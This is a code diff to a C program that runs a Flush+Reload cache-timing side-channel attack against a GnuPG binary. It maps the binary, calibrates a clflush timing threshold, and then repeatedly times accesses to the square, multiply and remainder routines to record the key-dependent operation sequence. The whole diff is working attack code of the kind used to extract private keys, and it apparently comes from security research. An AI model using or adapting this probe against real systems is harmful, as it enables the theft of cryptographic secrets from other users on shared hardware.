@@ -6,7 +6,7 @@
 
 void do_something(int times) {
     for(int i=0;i < times;i++) {
-        int j = i*2;
+        volatile int j = i*2;
         j++;
     }
     return;
@@ -17,8 +17,8 @@ int compare(const void * a, const void * b)
     return ( *(int*)a - *(int*)b );
 }
 
-#define NUM_ACCESSES 1000
-unsigned long long get_clflush_threshold (void *flush_addr) {
+#define NUM_ACCESSES 10000
+static inline int get_clflush_threshold (void *flush_addr) {
     long long access_times[NUM_ACCESSES];
     long long first_half_mean = 0, second_half_mean = 0;
     volatile void *y = (volatile void *)flush_addr;
@@ -42,15 +42,18 @@ unsigned long long get_clflush_threshold (void *flush_addr) {
             second_half_mean += access_times[i];
     first_half_mean /= (NUM_ACCESSES / 2);
     second_half_mean /= (NUM_ACCESSES / 2);
-    return floor (0.8 * first_half_mean + 0.2 * second_half_mean);
+    return floor (0.9 * first_half_mean + 0.1 * second_half_mean);
 }
 
 int main(int argc, char **argv) {
-    int fd = open(gnupg_path, O_RDONLY);
     unsigned char *addr;
-    unsigned long long THRESHOLD;
+    int THRESHOLD;
     int times;
     void *s_addr, *m_addr, *r_addr;
+    char data[30000];
+
+    memset (data, '\0', sizeof (data) / sizeof (char));
+    map_handle_t *file_map;
 
     if (argc != 2)
     {
@@ -58,17 +61,10 @@ int main(int argc, char **argv) {
         perror ("Not enough args given!\n");
     }
 
-    if (fd < 3)
-    {
-        perror ("Error: ");
-        return 3;
-    }
-
     times = atoi (argv[1]);
-    // map the binary (upto 64 MB)
-    addr = (unsigned char *) mmap(0, 64 * 1024 * 1024, PROT_READ, MAP_SHARED, fd, 0);
+    addr = map_file (gnupg_path, &file_map);
     THRESHOLD = get_clflush_threshold ((void *)addr);
-    printf ("THRESHOLD = %lld\n", THRESHOLD);
+    printf ("THRESHOLD = %d\n", THRESHOLD);
 
     if (addr == (void *) -1)
         return 4;
@@ -77,42 +73,44 @@ int main(int argc, char **argv) {
     m_addr = addr + multiply_add - base_add;
     r_addr = addr + remainder_add - base_add;
     // continuously probe the cache line
-    long long s = 0, m = 0, r = 0, i = 0;
+    /* long long s = 0, m = 0, r = 0; */
+    long long i = 0, j = 0;
     while (i < 1000000) {
-        unsigned long long atime;
-        unsigned long long btime;
-
-        clflush(m_addr);
-        clflush(r_addr);
-        clflush(s_addr);
-        clflush(&i);
-
-        atime = measure_one_block_access_time ((void *) m_addr);
-        btime = measure_one_block_access_time ((void *) &i);
-        printf ("%lld, %lld\n", atime, btime);
-        if (atime < THRESHOLD)
-        {
-            printf ("M");
-            m++;
-        }
+        int atime;
 
         atime = measure_one_block_access_time ((void *) r_addr);
         if (atime < THRESHOLD)
         {
-            printf ("r");
-            //fflush(stdout);
-            r++;
+            data[j++] = 'r';
+            /* printf ("r"); */
         }
 
         atime = measure_one_block_access_time ((void *) s_addr);
         if (atime < THRESHOLD)
         {
-            printf ("S");
-            s++;
+            data[j++] = 'S';
+            /* printf ("S"); */
         }
+
+        atime = measure_one_block_access_time ((void *) m_addr);
+        if (atime < THRESHOLD)
+        {
+            data[j++] = 'M';
+            /* printf ("M"); */
+        }
+
         i++;
+        clflush(m_addr);
+        clflush(r_addr);
+        clflush(s_addr);
+
         do_something(times);
     }
-    printf ("\n");
+    for (int i = 0; i < j; i++) {
+        if (data[i] == '\0')
+            break;
+        printf ("%c", data[i]);
+    }
+    printf ("\n"); 
     return 0;
 }
